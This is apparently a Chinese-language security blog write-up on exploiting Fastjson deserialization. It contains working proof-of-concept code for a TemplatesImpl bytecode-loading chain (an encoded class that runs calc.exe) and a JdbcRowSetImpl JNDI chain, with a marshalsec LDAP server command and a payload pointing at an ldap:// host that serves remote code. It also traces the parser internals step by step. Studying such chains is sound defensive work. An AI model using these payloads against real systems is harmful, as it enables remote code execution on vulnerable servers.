#### POC
    //EvilCalss.java
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import java.io.IOException;
    public class EvilClass extends AbstractTranslet {
        public EvilClass() throws IOException {
            Runtime.getRuntime().exec("calc.exe");
        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException{
        }
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{
        }
        public static void main(String[] args) throws Exception{
            EvilClass evilClass = new EvilClass();
        }
    }
将其编译为字节码文件
    package test;
    import java.io.ByteArrayOutputStream;
    import java.io.FileInputStream;
    import java.util.Base64;
    import java.util.Base64.Encoder;
    public class HelloWorld {
        public static void main(String args[]) {
            byte[] buffer = null;
            String filepath = ".\\src\\main\\java\\test\\EvilClass.class";
            try {
                FileInputStream fis = new FileInputStream(filepath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int n;
                while((n = fis.read(b))!=-1) {
                    bos.write(b,0,n);
                }
                fis.close();
                bos.close();
                buffer = bos.toByteArray();
            }catch(Exception e) {
                e.printStackTrace();
            }
            Encoder encoder = Base64.getEncoder();
            String value = encoder.encodeToString(buffer);
            System.out.println(value);
        }
    }
得到
    yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg
poc
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    public class POC1 {
        public static void main(String[] args) {
            String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\"}";
            JSON.parseObject(payload, Feature.SupportNonPublicField);
        }
    }
**前置问答**  
Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入`Feature.SupportNonPublicField`在parseObject中才能触发；
#### 动态加载字节码分析
首先分析后半部分 即`TemplatesImpl`中的链子  
由上文我们知道 ，fastjson使用`JSON.parseObject`方法反序列化会调用get 和set方法  
在`TemplatesImpl`中属性的get和set方法中  
`getOutputProperties`方法调用了`newTransformer`方法
在`newTransformer`中调用了`getTransletInstance`方法
这里需要调用到`defineTransletClasses`所以需要使`_name!=null,_class == null`
在defineTransletClasses中 重写了defineClass方法 对`_bytecodes`中的恶意代码进行加载
这部分其实就是CC4 的后半部分
#### parseObject起步
然后正向分析 从`JSON.parseObject`起步  
可以看到，本质上 parseObject方法也是调用了parse方法，只是强转了一下对象的类型
这里返回的parse的重载方法
跟进发现新建了一个`DefaultJSONParser`对象
跟进这个this
判断第一个字符是不是`{`如果是，就把token设置为12 ，不是就是14
出来之后跟进parse方法
由于原来token设置的是LBRACE也就是12 所以直接走`case LBRACE`
#### 析出key
调用parseObject方法 取出key 也就是@type
然后调用loadClass把恶意类加载到clazz中 这里跟进loadClass  
把键值className添加到clazz中
再之后在`DefaultJSONParser`类中
build方法 通过反射加载clazz中的所有方法 位置`com.alibaba.fastjson.util.JavaBeanInfo`
在build方法中 查找set 和get
这里筛选和查找出了get和set方法 这里就可以获取到`TemplatesImpl`的`getOutputProperties()`方法
#### 关于base64编码
`com.alibaba.fastjson.parser.DefaultJSONParser的parseObject方法`
### JdbcRowSetImpl链子
`com.sun.rowset.JdbcRowSetImpl`中的`dataSourceName`属性 寻找他的set方法
跟进`setDataSourceName`
这里就是把传进去的值赋给`dataSource`  
这里再看`autoCommit`，需要传入一个布尔类型的参数
判断conn是否为空 不然就赋值 跟进connect方法
`lookup(getDataSourceName())` lookup函数链接我们写入的服务 加载我们的恶意类  
构造恶意类
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.io.IOException;
    import java.io.Serializable;
    import java.util.Hashtable;
    public class Exploit implements ObjectFactory, Serializable {
        public Exploit(){
            try{
                Runtime.getRuntime().exec("calc.exe");
            }catch (IOException e){
                e.printStackTrace();
            }
        }
        public static void main(String[] args) {
            Exploit exploit = new Exploit();
        }
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
            return null;
        }
    }
把恶意类通过javac进行编译 编译为class文件  
在当前目录起一个python的web服务
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
[http://127.0.0.1:9000/#Exp](http://127.0.0.1:9000/#Exp) 1099`起一个ladp服务  
payload：
    public class FastjsonTest {
        public static void main(String[] args) {
            String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/#Exp\", \"autoCommit\":false}";
                    JSON.parse(payload);
        }
    }
## 参考